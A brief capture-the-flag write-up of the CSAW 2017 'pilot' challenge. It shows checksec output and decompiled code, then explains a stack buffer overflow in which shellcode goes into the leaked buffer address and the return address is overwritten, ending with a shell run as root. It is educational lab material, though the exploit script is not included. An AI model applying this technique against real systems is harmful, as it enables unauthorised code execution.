# CSAW 2017 pilot

This appears to be a ```C++``` binary. Looking over ```checksec```:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

```c
  this_00 = (basic_ostream<char,std--char_traits<char>> *)
            operator<<((basic_ostream<char,std--char_traits<char>> *)this,local_28);
  operator<<(this_00,endl<char,std--char_traits<char>>);
  operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Command:");
  sVar1 = read(0,local_28,0x40);
```
We are given the address of ```local_28```, which is at ```rbp-0x20```. We can write a ```shellcode``` and overflow until we reach ```ret```, which we will replace with that address.

```bash
[root@pwn:~/csaw17_pilot]$ python expl.py 
[+] Starting local process './pilot': pid 2185
0x7fff31ffb560
[*] Switching to interactive mode
[*]Command:$ whoami
root
```